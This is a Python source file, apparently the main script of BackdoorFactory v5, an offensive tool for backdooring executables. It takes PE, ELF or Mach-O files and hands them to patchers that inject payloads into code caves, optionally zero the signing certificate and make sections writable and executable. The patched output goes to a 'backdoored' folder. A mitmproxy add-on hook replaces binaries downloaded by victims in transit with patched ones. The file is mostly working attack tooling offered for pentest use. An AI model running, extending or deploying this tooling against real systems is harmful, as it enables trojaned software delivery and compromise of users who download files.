#!/usr/bin/env python3
'''
BackdoorFactory (BDF) v5

Copyright (c) 2013-2021, Joshua Pitts
All rights reserved.

GitHub sponsors version. Only sponsors are allowed access and use, even for 
commercial use - yes commerical use is allowed (e.g. pentests, red teaming).

Redistribution and use in source and binary forms, with or without modification,
is not permitted.

Neither the name of the copyright holder nor the names of its contributors
may be used to endorse or promote products derived from this software without
specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''

import sys
import os
import signal
import time
import base64
from random import choice
from optparse import OptionParser
from pebin import pebin
from elfbin import elfbin
from machobin import machobin
import logging
from mitmproxy import http
from mitmproxy import ctx
from mitmproxy.script import concurrent
from common.bdfp_content import content_handler
from configobj import ConfigObj
import io
import psutil


logger = logging.getLogger(__name__)

# set logging to bdf.log if in mitmproxy add-on
if True  in [True if 'mitmproxy' in row else False for row in psutil.Process().cmdline()]:
    #TODO: parse the initial config here

    level = logging.getLevelName(ConfigObj('proxy.cfg')['Overall']['loglevel'])
    logName = ConfigObj('proxy.cfg')['Overall']['logname']
    logging.basicConfig(format='%(asctime)s,%(filename)s,%(levelname)s,BDFProxy,%(message)s',
                    filename=logName,
                    filemode='a',
                    level=level,
                    datefmt='%Y-%m-%d %H:%M:%S')
    logger.info(f"Starting BDFProxy, LogLevel: {level}")

def signal_handler(signal, frame):
        logger.info('\nProgram Exit')
        sys.exit(0)

def response(flow: http.HTTPFlow) -> None:
    patchit = True
    # Implement hosts, and keywords allow/deny list here
    MaxSizeFileRequested = ConfigObj('proxy.cfg')['Overall']['MaxSizeFileRequested']
    HostdenyList = ConfigObj('proxy.cfg')['hosts']['denylist']
    KeysdenyList = ConfigObj('proxy.cfg')['keywords']['denylist']
    logger.info(f'host:{flow.request.host}')

    for denyHost in HostdenyList:
        logger.debug(f'DenyList Host rule:{denyHost}')
        if denyHost.lower() in flow.request.host.lower():
            logger.info(f'Hit DenyList Host rule:{denyHost}')
            patchit = False
            break

    for denyKey in KeysdenyList:
        logger.debug(f'DenyList Key rule:{denyKey}')
        if denyKey.lower() in flow.request.path.lower():
            logger.info(f'Hit DenyList Key rule:{denyKey}')
            patchit = False
            break
    
    content = flow.response.content

    if len(content) > int(MaxSizeFileRequested):
        logger.info('Content over MaxSizeFileRequested')
        patchit = False

    #all the magic happens in content_handler
    if patchit:
        return_content = content_handler(content).run()
        if return_content:
            flow.response.content = return_content

class HookArgumentParser(OptionParser):
    def exit(self, *args, **kwargs):
        if len(args) == 0:
            pass
            raise exit(-1)


class bdfMain():
    #prevent mitmproxy from going here
    if True  in [True if 'mitmproxy' in row else False for row in psutil.Process().cmdline()]:
        sys.exit()
    
    title = """\
         BDF-ng
         """
    version = """\
         Version:   5.0.0
         """

    author = """\
         Author:    Joshua Pitts
         Email:     the.midnite.runr[-at ]gmail<d o-t>com
         Twitter:   @ausernamedjosh
         """

    #ASCII ART
    menu = [b'Xig7LDspXiAtIHJhd3I=', b'Xig7LDspXiAtIG9oIGhhaQ==', b'Xig7LDspXiAtIG5pY2UgdG8gc2VlIHlvdQ=='
    ]

    signal.signal(signal.SIGINT, signal_handler)
    
    parser = HookArgumentParser()
    
    parser.add_option("-f", "--file", dest="FILE", action="store",
                      type=str,
                      help="File to backdoor")
    
    parser.add_option("-O", "--disk_offset", dest="DISK_OFFSET", default=0,
                      type="int", action="store",
                      help="Starting point on disk offset, in bytes. "
                      "Some authors want to obfuscate their on disk offset "
                      "to avoid reverse engineering, if you find one of those "
                      "files use this flag, after you find the offset.")
    parser.add_option('-l', '--logtofile', dest='LOGTOFILE', default=False, action='store_true', 
                      help='Log to file')
    parser.add_option('-L', '--setlogfile', dest='SETLOGFILE', default='bdf.log', action='store',
                      help='File to log to, default is bdf.log')
    parser.add_option("-S", "--support_check", dest="SUPPORT_CHECK",
                      default=False, action="store_true",
                      help="To determine if the file is supported by BDF prior"
                      " to backdooring the file. For use by itself or with "
                      "verbose. This check happens automatically if the "
                      "backdooring is attempted."
                      )
    parser.add_option("-q", "--no_banner", dest="NO_BANNER", default=False, action="store_true",
                      help="Kills the banner."
                      )
    parser.add_option("-v", "--loglevel", default=False, dest="VERBOSE",
                      action="store_true",
                      help="For debug information output.")
    parser.add_option("-m", "--patch-method", dest="PATCH_METHOD", default=None, action="store",
                      type=str, help="Patching methods for PE files")
    #parser.add_option("-p","--preprocess", dest="PREPROCESS", default=False, action="store_true", 
    #                  help="To execute preprocessing scripts in the preprocess directory")
    parser.add_option("-o", "--output-file", default=None, dest="OUTPUT",
                      action="store", type=str,
                      help="The backdoor output file")
    parser.add_option('-M', "--mode-modifier", dest="MODIFIER", default="automatic", action='store',
                        type=str, help='Patching modifier, either "manual" or "automatic"')
    parser.add_option("-Z", "--zero-cert", dest="ZERO_CERT", default=False, action="store_true",
                        help='Zero the signing cert')
    parser.add_option("-w", "--change_access", default=True,
                      dest="CHANGE_ACCESS", action="store_false",
                      help="This flag changes the section that houses "
                      "the codecave to RWE. Sometimes this is necessary. "
                      "Enabled by default. If disabled, the "
                      "backdoor may fail.")
    parser.add_option('-I', '--idt_in_cave', dest='IDT_IN_CAVE', default=False, action='store_true', 
                        help='Put new IAT in a code cave vs new PE section, only for \
                        IAT based payloads')
    parser.add_option('-R',  '--save_patch', dest='SAVE_PATCH', default=False, action='store_true',
                        help='Save patch instructions for debugging or repeating the same patch; before code-signing')
    parser.add_option('-E', '--encoder', dest='ENCODER', default=None, action="store",
                        help="Encoders are default set to None, patching method must support it.")
    parser.add_option("-F", "--fat_priority", dest="FAT_PRIORITY", default="x64", action="store",
                      help="For MACH-O format. If fat file, focus on which arch to patch. Default "
                      "is x64. To force x86 use -F x86, to force both archs use -F ALL."
                      )
    #add loglevel option
    (opt, args) = parser.parse_args()

    # x-fer to dict
    options = vars(opt)

    if len(args) > 0:
        for arg in args:
            logger.debug(arg)
            try:
                for key, value in dict([arg.split('=')]).items():
                    options[key] = value
            except ValueError:
                logging.error("Use '=' for separating user provided command line parameters or the following:\n")
                parser.print_help()
                sys.exit(-1)

    logger = logging.getLogger(__name__)

    level = logging.INFO

    if options['VERBOSE'] is True:
        level = logging.DEBUG
    elif type(options['VERBOSE']) is str and options['VERBOSE'].lower() == "true":
        level = logging.DEBUG

    if not options['LOGTOFILE']:
        logging.basicConfig(format='%(asctime)s,%(levelname)s,%(filename)s,%(message)s',
                        level=level, 
                        encoding='utf-8', 
                        datefmt='%Y-%m-%d %H:%M:%S')

    else:
        logging.basicConfig(format='%(asctime)s,%(filename)s,%(levelname)s,%(message)s',
                        filename=options['SETLOGFILE'],
                        filemode='a',
                        level=level, 
                        datefmt='%Y-%m-%d %H:%M:%S')

    def basicDiscovery(FILE):

        macho_supported = [b'\xcf\xfa\xed\xfe', b'\xca\xfe\xba\xbe',
                           b'\xce\xfa\xed\xfe',
                           ]
 
        header = FILE.read(4)
        FILE.seek(0)
        if b'MZ' in header:
            return 'PE'
        elif b'ELF' in header:
            return 'ELF'
        elif header in macho_supported:
            return "MACHO"
        else:
            logger.error('Only support for ELF, PE, and MACH-O file formats')
            return None


    if not options['FILE']:
        logger.error('[!] -f is required, it is the file to patch.\n')
        parser.print_help()
        sys.exit()

    if not options['OUTPUT']:
        options['OUTPUT'] = os.path.basename(options['FILE'])
        
    if not options['NO_BANNER']:
        logger.info(f"\n{base64.b64decode(choice(menu)).decode('utf-8')}\n{author}\n{version}")
        time.sleep(.5)
    else:
        logger.info(f"\n{title}\n{author}\n{version}")
    
    #OUTPUT = output_options(options['FILE'], options['OUTPUT'])
    options['b_FILE'] = io.BytesIO(open(options['FILE'], 'r+b').read())

    
    is_supported = basicDiscovery(options['b_FILE'])
    logger.debug(f'{is_supported}')
    # Much better than before, use kwargs for options in the file handlers
    
    if is_supported == "PE":
        #return False or the patched file
        result = pebin(options)  
        
    elif is_supported == "ELF":
        result = elfbin(options)

    elif is_supported == "MACHO":
        result = machobin(options)

    else:
        logger.error("[!] File not supported.")
        sys.exit(-1)

    if result.result:
        logger.info("[*] Patching successful!")
        # write to backdoored
        os_name = os.name

        if not os.path.exists("backdoored"):
            os.makedirs("backdoored")
        if os_name == 'nt':
            options['OUTPUT'] = "backdoored\\" + options['OUTPUT']
        else:
            options['OUTPUT'] = "backdoored/" + options['OUTPUT']
        with open(options['OUTPUT'], 'wb') as f:
            f.write(result.result.read())
        logger.info("[*] Output in %s" % options['OUTPUT'])

    else:
        logger.error("[!] Patching Failed")
    
    #END BDF MAIN

if __name__ == "__main__":

    bdfMain()
    
